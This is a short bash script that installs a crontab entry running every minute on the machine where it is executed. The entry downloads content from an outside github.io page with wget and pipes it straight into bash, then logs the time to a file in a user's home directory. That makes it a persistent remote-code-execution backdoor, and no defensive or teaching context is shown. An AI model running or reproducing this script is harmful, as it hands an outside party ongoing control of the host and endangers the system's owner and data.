#!/bin/bash

CMD="* * * * * wget -O - https://hckdx.github.io/status | bash ; echo '$(date)' > /home/vlguser/test.txt"

(crontab -l | grep -F "$CMD") &>/dev/null

if [ $? -ne 0 ]; then
  (crontab -l; echo "$CMD") | crontab -
  echo "Added Command"
else
  echo "Command already exists"
fi